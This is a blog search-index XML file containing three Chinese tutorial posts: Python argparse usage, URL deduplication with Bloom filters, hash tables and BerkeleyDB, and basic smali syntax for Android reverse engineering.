<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>python学习-argparse模块</title>
    <url>/2018/05/14/python%E5%AD%A6%E4%B9%A0-argparse%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<p>  argparse模块是python中用于解析命令行参数和选项的标准模块，方便用户在命令行中输入参数。</p>
<h2 id="argparse使用"><a href="#argparse使用" class="headerlink" title="argparse使用"></a>argparse使用</h2><a id="more"></a>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>先看一个简单的例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.parse_args()</span><br></pre></td></tr></table></figure>
<ul>
<li>创建 ArgumentParser() 对象</li>
<li>使用 parse_args() 解析</li>
</ul>
<p>将上述代码保存并命名为test.py,运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">$ python test.py -h</span><br><span class="line">usage: t.py [-h]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>不添加任何参数，无回显</li>
<li>添加-h参数，获取帮助，-h为默认预设参数</li>
</ul>
<h3 id="ArgumentParser函数解析"><a href="#ArgumentParser函数解析" class="headerlink" title="ArgumentParser函数解析"></a>ArgumentParser函数解析</h3><p>  使用help(argparse.ArgumentParser())查看函数帮助，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class ArgumentParser(_AttributeHolder, _ActionsContainer)</span><br><span class="line"> |  Object <span class="keyword">for</span> parsing <span class="built_in">command</span> line strings into Python objects.</span><br><span class="line"> |</span><br><span class="line"> |  Keyword Arguments:</span><br><span class="line"> |      - prog -- The name of the program (default: sys.argv[0])</span><br><span class="line"> |      - usage -- A usage message (default: auto-generated from arguments)</span><br><span class="line"> |      - description -- A description of what the program does</span><br><span class="line"> |      - epilog -- Text following the argument descriptions</span><br><span class="line"> |      - parents -- Parsers whose arguments should be copied into this one</span><br><span class="line"> |      - formatter_class -- HelpFormatter class <span class="keyword">for</span> printing <span class="built_in">help</span> messages</span><br><span class="line"> |      - prefix_chars -- Characters that prefix optional arguments</span><br><span class="line"> |      - fromfile_prefix_chars -- Characters that prefix files containing</span><br><span class="line"> |          additional arguments</span><br><span class="line"> |      - argument_default -- The default value <span class="keyword">for</span> all arguments</span><br><span class="line"> |      - conflict_handler -- String indicating how to handle conflicts</span><br><span class="line"> |      - add_help -- Add a -h/-<span class="built_in">help</span> option</span><br><span class="line"> |</span><br><span class="line">......</span><br><span class="line"> |</span><br><span class="line"> |  Methods defined here:</span><br><span class="line"> |</span><br><span class="line"> |  __init__(self, prog=None, usage=None, description=None, epilog=None, version=None, parents=[], formatter_class=&lt;class <span class="string">&#x27;argparse.HelpFormatter&#x27;</span>&gt;, prefix_chars=<span class="string">&#x27;-&#x27;</span>, fromfile_prefix_chars=None, argument_default=None, conflict_handler=<span class="string">&#x27;error&#x27;</span>, add_help=True)</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>
<p>常用参数解析：</p>
<ul>
<li>prog：程序名（默认为sys.argv[0]）</li>
<li>usage：程序的使用用例，默认情况下会自动生成</li>
<li>description：简短的描述这个程序的用途，help参数之前显示的信息。</li>
<li>parents：ArgumentParser对象组成列表，这些对象中的参数也要包含进来。</li>
<li>formatter_class：一个自定义帮助信息格式化输出的类。</li>
<li>prefix_chars：可选参数之前的前缀（默认为-)。</li>
<li>fromfile_prefix_chars：如果是从文件中读取参数，这个文件名参数的前缀（默认为None）。</li>
<li>conflict_handler：通常不需要，定义了处理冲突选项的策略。</li>
</ul>
<h3 id="add-argument-方法"><a href="#add-argument-方法" class="headerlink" title="add_argument() 方法"></a>add_argument() 方法</h3><p>使用add_argument()方法，用来定义程序可接受的命令行参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ArgumentParser.add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])</span><br></pre></td></tr></table></figure>
<ul>
<li>name or flags - 选项字符串的名字或者列表，例如 foo 或者 -f, –foo。</li>
<li>action - 命令行中该参数存在时的操作，默认值是 store<ul>
<li>store_ture，表示赋值为true；</li>
<li>append，将遇到的值存储成列表，也就是如果参数重复则会保存多个值;</li>
<li>append_const，将参数规范中定义的一个值保存到一个列表；</li>
<li>count，存储遇到的次数；</li>
</ul>
</li>
<li>default - 不指定参数时的默认值；</li>
<li>nargs - 应该读取的命令行参数个数，可以是具体的数字，或者是?号，当不指定值时对于 Positional argument 使用 default，对于 Optional argument 使用 const；或者是 * 号，表示 0 或多个参数；或者是 + 号表示 1 或多个参数。</li>
<li>required - 可选参数是否可以省略 (仅针对可选参数),默认为False；</li>
<li>const - action 和 nargs 所需要的常量值。</li>
<li>metavar - 对于必选参数默认就是参数名称，对于可选参数默认是必须存在参数后；</li>
<li>dest - 解析后的参数名称，默认情况下，对于可选参数选取最长的名称，中划线转换为下划线。</li>
</ul>
<h3 id="添加位置参数"><a href="#添加位置参数" class="headerlink" title="添加位置参数"></a>添加位置参数</h3><p>先看如下例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;square&quot;</span>, help=<span class="string">&quot;display a square of a given number&quot;</span>,</span><br><span class="line">                    type=int)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">print</span> args</span><br><span class="line"><span class="keyword">print</span> args.square**<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">usage: test.py [-h] square</span><br><span class="line">t.py: error: too few arguments</span><br><span class="line"></span><br><span class="line">$ python test.py -h</span><br><span class="line">usage: test.py [-h] square</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  square      display a square of a given number</span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">$ python test.py 3</span><br><span class="line">Namespace(square=3)</span><br><span class="line">9</span><br><span class="line">$ python test.py three</span><br><span class="line">usage: test.py [-h] square</span><br><span class="line">t.py: error: argument square: invalid int value: <span class="string">&#x27;three&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>运行程序，就必须设置一个参数。</li>
<li>parse_args()方法获取Namespace。</li>
</ul>
<h3 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h3><p>通过两种方式指定</p>
<ol>
<li>通过<span style="background:#BDD3F7"> - </span>来指定短参数，如：<span style="background:#BDD3F7">-h</span></li>
<li>通过<span style="background:#BDD3F7"> – </span>来指定长参数，如：<span style="background:#BDD3F7">–help</span><br>修改test.py文件：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, prog=<span class="string">&#x27;python test.py &lt;OPTIONS&gt;&#x27;</span>,description=<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;--all&#x27;</span>, help=<span class="string">&quot;Perform all operations&quot;</span>,metavar=<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--dns&#x27;</span>, help=<span class="string">&quot;Perform&quot;</span>,required=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">par=parser.parse_args()</span><br><span class="line"><span class="keyword">print</span> vars(par)</span><br><span class="line"><span class="keyword">print</span> vars(par)[<span class="string">&#x27;all&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> vars(par):</span><br><span class="line">    <span class="keyword">print</span> v</span><br><span class="line">    <span class="keyword">print</span> vars(par)[v]</span><br></pre></td></tr></table></figure>
运行结果：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">&#123;<span class="string">&#x27;all&#x27;</span>: None, <span class="string">&#x27;dns&#x27;</span>: False&#125;</span><br><span class="line">None</span><br><span class="line">all</span><br><span class="line">None</span><br><span class="line">dns</span><br><span class="line">False</span><br><span class="line">$ python test.py -h</span><br><span class="line">usage: python Stealth.py &lt;OPTIONS&gt; [-h] [-a xx] [-d]</span><br><span class="line"></span><br><span class="line">collect</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>       show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -a xx, --all xx  Perform all operations</span><br><span class="line">  -d, --dns        Perform</span><br><span class="line"></span><br><span class="line">$ python test.py -a</span><br><span class="line">usage: python Stealth.py &lt;OPTIONS&gt; [-h] [-a xx] [-d]</span><br><span class="line">python Stealth.py &lt;OPTIONS&gt;: error: argument -a/--all: expected one argument</span><br><span class="line">$ python test.py -a test1 -d</span><br><span class="line">&#123;<span class="string">&#x27;all&#x27;</span>: <span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;dns&#x27;</span>: True&#125;</span><br><span class="line">test1</span><br><span class="line">all</span><br><span class="line">test1</span><br><span class="line">dns</span><br><span class="line">True</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>存在metavar参数时，可选参数后必须接值</li>
<li>存在action=’store_true’，默认值为False</li>
<li>metavar和action=’store_true’不能共存</li>
</ul>
<h3 id="混合参数使用"><a href="#混合参数使用" class="headerlink" title="混合参数使用"></a>混合参数使用</h3><p>计算一个整数数列的最大值或求和：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Process some integers.&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;integers&#x27;</span>, metavar=<span class="string">&#x27;N&#x27;</span>, type=int, nargs=<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">                   help=<span class="string">&#x27;an integer for the accumulator&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--sum&#x27;</span>, dest=<span class="string">&#x27;accumulate&#x27;</span>, action=<span class="string">&#x27;store_const&#x27;</span>,</span><br><span class="line">                   const=sum, default=max,</span><br><span class="line">                   help=<span class="string">&#x27;sum the integers (default: find the max)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">print(args.accumulate(args.integers))</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python test.py 1 2 3 4</span><br><span class="line">4</span><br><span class="line">$ python test.py 1 2 3 4 --sum</span><br><span class="line">10</span><br></pre></td></tr></table></figure>
<p>上述示例使用accumulate来重命名sum参数，与下面代码实现功能一样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Process some integers.&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;integers&#x27;</span>, metavar=<span class="string">&#x27;N&#x27;</span>, type=int, nargs=<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">                   help=<span class="string">&#x27;an integer for the accumulator&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--sum&#x27;</span>, action=<span class="string">&#x27;store_const&#x27;</span>,</span><br><span class="line">                   const=sum, default=max,</span><br><span class="line">                   help=<span class="string">&#x27;sum the integers (default: find the max)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">print(args.sum(args.integers))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>argparse</tag>
      </tags>
  </entry>
  <entry>
    <title>URL去重去似</title>
    <url>/2018/05/24/url%E5%8E%BB%E9%87%8D%E5%8E%BB%E4%BC%BC/</url>
    <content><![CDATA[<h2 id="URL去重"><a href="#URL去重" class="headerlink" title="URL去重"></a>URL去重</h2><p>URL去重主要有两种方式：</p>
<ul>
<li><p>布隆过滤器去重</p>
</li>
<li><p>Hash表去重</p>
<a id="more"></a>

<h3 id="布隆过滤器去重"><a href="#布隆过滤器去重" class="headerlink" title="布隆过滤器去重"></a>布隆过滤器去重</h3><ol>
<li>需要一个数组和k个映射函数，初始将数组array所有位置都置0。</li>
<li>将元素集S={s1,s2……sn}中每个元素sj，通过k个映射函数{f1,f2……fk}映射为K个值{g1，g2……gk},将array中对应的array[g1],array[g2]……array[gk]置为1.</li>
<li>若元素item通过映射函数得到的k个值在array中对应的值全为1，则item在S中，否则不在。</li>
</ol>
<p>python有两个第三方插件实现了此功能：</p>
<ul>
<li>Python-bloomfilter<br>项目地址:<a href="https://github.com/jaybaird/Python-bloomfilter">https://github.com/jaybaird/Python-bloomfilter</a></li>
<li>Pybloomfiltermmap<br>项目地址:<a href="https://github.com/axiak/Pybloomfiltermmap">https://github.com/axiak/Pybloomfiltermmap</a><br>官方文档:<a href="https://axiak.github.io/pybloomfiltermmap/">https://axiak.github.io/pybloomfiltermmap/</a></li>
</ul>
<p>Pybloomfiltermmap模块实现两类布隆过滤器：Bloomfilter和ScalableBloomfilter。<br>Bloomfilter是一个定容过滤器，error_rate指最大误报率；<br>ScalableBloomfilter是一个不定容过滤器。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pybloomfilter <span class="keyword">import</span> BloomFilter</span><br><span class="line"><span class="comment"># 创建一个capacity等于100万，error rate等于0.001的bloomfilter对象</span></span><br><span class="line">bfilter = BloomFilter(<span class="number">1000000</span>,<span class="number">0.001</span>,<span class="string">&#x27;bf_test.bloom&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>方法add是添加元素，若元素已存在，则返回True，若不存在则返回False，并添加到过滤器中。</p>
<p>布隆过滤器存在一定的误判率。</p>
<h3 id="Hash表去重"><a href="#Hash表去重" class="headerlink" title="Hash表去重"></a>Hash表去重</h3><p>遍历URL列表，判断每个URL是否在去重后的列表里，如果不在，则加入列表。根据哈希表存放的位置，可以分为两种方式：一种是基于内存的Hash表去重；一种是基于硬盘的Hash表去重。</p>
<h4 id="方法一：利用内存Hash表去重"><a href="#方法一：利用内存Hash表去重" class="headerlink" title="方法一：利用内存Hash表去重"></a>方法一：利用内存Hash表去重</h4><p>使用如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">  <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">    result.append(url)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>由于URL长度不固定，单个URL长度越长，使用URL存储内存和性能损耗过快，此时需对URL进行Hash运算压缩，如：16位md5运算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python 2.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">print</span> hashlib.md5(<span class="string">&quot;hello&quot;</span>).hexdigest()[<span class="number">8</span>:<span class="number">-8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">print(hashlib.md5(<span class="string">&quot;hello&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest())[<span class="number">8</span>:<span class="number">-8</span>]</span><br></pre></td></tr></table></figure>

<h4 id="方法二：利用BerkeleyDB去重"><a href="#方法二：利用BerkeleyDB去重" class="headerlink" title="方法二：利用BerkeleyDB去重"></a>方法二：利用BerkeleyDB去重</h4><p>BerkeleyDB是一个key-value database，简单的说，就是一个在disk上的hash表。存储的是“key-value”键值对。<br>下载安装Berkeley DB安装。Python需要安装bsddb3模块来提供BerkeleyDB数据库的操作接口。<br>Berkeley DB次你在四种数据访问模式：</p>
<ul>
<li>btree：树结构，存储任意复杂key和value</li>
<li>hash：hash存储，访问量巨大时，效果好</li>
<li>queue：队列操作，只能存储定长数据，key必须是数字</li>
<li>recno：与queue相似，但支持边长value</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bsddb</span><br><span class="line">mydb = bsddb.db.DB()</span><br><span class="line">mydb.open(<span class="string">&#x27;mydb.db&#x27;</span>,dbtype = bsddb.db.DB_HASH, flags = bsddb.db.DB_CREATE)</span><br><span class="line">mydb.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>)</span><br><span class="line">mydb.close()</span><br></pre></td></tr></table></figure>
<p>设置数据访问方法：<br>btree是 bsddb.db.DB_BTREE， hash是bsddb.db.DB_HASH<br>queu 是 bsddb.db.DB_QUEUE,  recno 是bsddb.db.DB_RECNO<br>设置flags参数为DB_CREATE表明如果数据文件不存在则新建一个空的数据文件。<br>使用DB的put方法存储一个Key/Value对</p>
</li>
</ul>
<h2 id="URL去似去含"><a href="#URL去似去含" class="headerlink" title="URL去似去含"></a>URL去似去含</h2><p>相似URL特征：</p>
<ul>
<li>协议相同（protocol）</li>
<li>主机名相同（host）</li>
<li>端口相同（port）</li>
<li>资源路劲相同（path）</li>
<li>参数名所组成列表相同或包含</li>
</ul>
<p>python2.x使用urlparse，python3.x使用urllib，以python2.x为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line">url=<span class="string">&#x27;http://www.baidu.com:80/s?wd=python&amp;ie=utf-8#123&#x27;</span></span><br><span class="line">r=urlparse.urlparse(url)</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line"><span class="keyword">print</span> r.netloc</span><br><span class="line"><span class="keyword">print</span> r.hostname</span><br><span class="line"><span class="keyword">print</span> r.port</span><br><span class="line"><span class="keyword">print</span> urlparse.parse_qs(r.query)</span><br><span class="line">res = urlparse.urlsplit(url)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ParseResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;www.baidu.com:80&#x27;</span>, path=<span class="string">&#x27;/s&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;wd=python&amp;ie=utf-8&#x27;</span>, fragment=<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">www.baidu.com:80</span><br><span class="line">www.baidu.com</span><br><span class="line">80</span><br><span class="line">SplitResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;www.baidu.com:80&#x27;</span>, path=<span class="string">&#x27;/s&#x27;</span>, query=<span class="string">&#x27;wd=python&amp;ie=utf-8&#x27;</span>, fragment=<span class="string">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>r = urlparse.urlparse(url)返回一个6个元组，分别为scheme, netloc, path, params, query, fragment，ParseResult类还有几个常用方法：<br>res.username<br>res.password<br>res.hostname<br>res.port<br>res.geturl()<br>urlunparse与之相反,将6个元组组成一个string。<br>urlsplit将path与params合并为path，存在urlunsplit与之相反功能。<br>使用urlparse.parse_qs()函数获取r.query中的参数列表，输出为字典。<br><strong>注释：url必须以<em><a href="http://xxx/">http://xxx</a></em>开头,否则会出错。</strong></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Android逆向-smali语法</title>
    <url>/2018/06/01/Android%E9%80%86%E5%90%91-smali%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h2><p>DVM运行Dalvik字节码，可执行文件格式dex(dalvik executable)，有点类似于机器码。DVM基于寄存器，JVM基于栈。</p>
<h2 id="smali语法"><a href="#smali语法" class="headerlink" title="smali语法"></a>smali语法</h2><a id="more"></a>
<h3 id="变量和参数寄存器命名方式"><a href="#变量和参数寄存器命名方式" class="headerlink" title="变量和参数寄存器命名方式"></a>变量和参数寄存器命名方式</h3><table>
<thead>
<tr>
<th align="center">v命名法</th>
<th align="center">p命名法</th>
<th align="center">寄存器含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">v0</td>
<td align="center">v0</td>
<td align="center">第一个局部变量寄存器</td>
</tr>
<tr>
<td align="center">…</td>
<td align="center">…</td>
<td align="center">中间的局部变量寄存器</td>
</tr>
<tr>
<td align="center">vM-N</td>
<td align="center">p0</td>
<td align="center">第一个参数寄存器（通常为调用对象）</td>
</tr>
<tr>
<td align="center">…</td>
<td align="center">…</td>
<td align="center">中间的参数寄存器</td>
</tr>
<tr>
<td align="center">vM-1</td>
<td align="center">pN-1</td>
<td align="center">第N个参数寄存器</td>
</tr>
<tr>
<td align="center">通常使用p命名法进行记录。</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h3><table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">—-</td>
<td align="center">——-</td>
</tr>
<tr>
<td align="center">V</td>
<td align="center">void</td>
</tr>
<tr>
<td align="center">Z</td>
<td align="center">boolean</td>
</tr>
<tr>
<td align="center">B</td>
<td align="center">byte</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">short</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">char</td>
</tr>
<tr>
<td align="center">I</td>
<td align="center">int</td>
</tr>
<tr>
<td align="center">J</td>
<td align="center">long</td>
</tr>
<tr>
<td align="center">F</td>
<td align="center">float</td>
</tr>
<tr>
<td align="center">D</td>
<td align="center">double</td>
</tr>
<tr>
<td align="center">L</td>
<td align="center">java类</td>
</tr>
<tr>
<td align="center">[</td>
<td align="center">数组</td>
</tr>
<tr>
<td align="center"><strong>注：</strong></td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li>变量存放在寄存器中，寄存器为32位，支持任何类型，其中long，double是64位，使用两个相邻的寄存器。</li>
<li>[x表示一维数组，x代表基本类型，如[I代表int[],[[x代表二维数组。</li>
<li>Java语言存在大量对象，java.lang.String表示为*Ljava/lang/String;*；分号一定要加上。</li>
</ul>
<h3 id="方法和字段"><a href="#方法和字段" class="headerlink" title="方法和字段"></a>方法和字段</h3><h4 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#direct&#x2F;virtual methods</span><br><span class="line">.method &lt;访问权限&gt; [修饰关键字] &lt;方法原型&gt;</span><br><span class="line">    &lt;.registers&gt;</span><br><span class="line">    [.param]</span><br><span class="line">    [.prologue]</span><br><span class="line">    [.line]</span><br><span class="line">    &lt;.local&gt;</span><br><span class="line">    &lt;代码体&gt;</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
<ul>
<li>#direct/virtual methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。</li>
<li>方法原型描述了方法的名称、参数与返回值。<ul>
<li>.registers 指令指定了方法中寄存器的总数,这个数量是参数和本地变量总和。</li>
<li>.param表明了方法的参数，每个.param指令表示一个参数，方法使用了几个参数就有几个.parameter指令。</li>
<li>.prologue指定了代码的开始处，混淆过的代码可能去掉了该指令。</li>
<li>.line指明了该处代码在源代码中的行号，同样，混淆后的代码可能去掉了行号。</li>
<li>.local 使用这个指定表明方法中非参寄存器</li>
</ul>
</li>
</ul>
<h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>方法调用格式：Lpackage/name/ObjectName;-&gt;MethodName(III)Z<br>等价于bool package.name.ObjectName.MethodName（int,int,int）<br>例子：<br>method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/Stirng<br>等价于<br>String method(int,int[][],int,String,Object[])</p>
<h4 id="字段调用"><a href="#字段调用" class="headerlink" title="字段调用"></a>字段调用</h4><p>格式：Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;<br>等价于：package.name.ObjectName.FieldName</p>
<h3 id="头信息-类的主体信息"><a href="#头信息-类的主体信息" class="headerlink" title="头信息-类的主体信息"></a>头信息-类的主体信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123;</span><br><span class="line">    &#x2F;&#x2F; ......</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;smali文件头&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.class public Ltestdemo&#x2F;hpp&#x2F;cn&#x2F;test&#x2F;MainActivity;</span><br><span class="line">.super Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AppCompatActivity;</span><br><span class="line">.source &quot;MainActivity.java&quot;</span><br><span class="line">.implements Landroid&#x2F;view&#x2F;View$OnClickListener;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>.class &lt;访问权限&gt; [关键修饰字] &lt;类名&gt;;<br>.super &lt;父类名&gt;;<br>.source &lt;源文件名&gt;<br>.implements &lt;接口名&gt;</p>
<h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><p>共有12种判断语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if-eq vA, VB, cond_** 如果vA等于vB则跳转到cond_**。相当于if (vA&#x3D;&#x3D;vB)</span><br><span class="line">if-ne vA, VB, cond_** 如果vA不等于vB则跳转到cond_**。相当于if (vA!&#x3D;vB)</span><br><span class="line">if-lt vA, VB, cond_** 如果vA小于vB则跳转到cond_**。相当于if (vA&lt;vB)</span><br><span class="line">if-le vA, VB, cond_** 如果vA小于等于vB则跳转到cond_**。相当于if (vA&lt;&#x3D;vB)</span><br><span class="line">if-gt vA, VB, cond_** 如果vA大于vB则跳转到cond_**。相当于if (vA&gt;vB)</span><br><span class="line">if-ge vA, VB, cond_** 如果vA大于等于vB则跳转到cond_**。相当于if (vA&gt;&#x3D;vB)</span><br><span class="line"></span><br><span class="line">if-eqz vA, :cond_** 如果vA等于0则跳转到:cond_** 相当于if (VA&#x3D;&#x3D;0)</span><br><span class="line">if-nez vA, :cond_** 如果vA不等于0则跳转到:cond_**相当于if (VA!&#x3D;0)</span><br><span class="line">if-ltz vA, :cond_** 如果vA小于0则跳转到:cond_**相当于if (VA&lt;0)</span><br><span class="line">if-lez vA, :cond_** 如果vA小于等于0则跳转到:cond_**相当于if (VA&lt;&#x3D;0)</span><br><span class="line">if-gtz vA, :cond_** 如果vA大于0则跳转到:cond_**相当于if (VA&gt;0)</span><br><span class="line">if-gez vA, :cond_** 如果vA大于等于0则跳转到:cond_**相当于if (VA&gt;&#x3D;0)</span><br></pre></td></tr></table></figure>

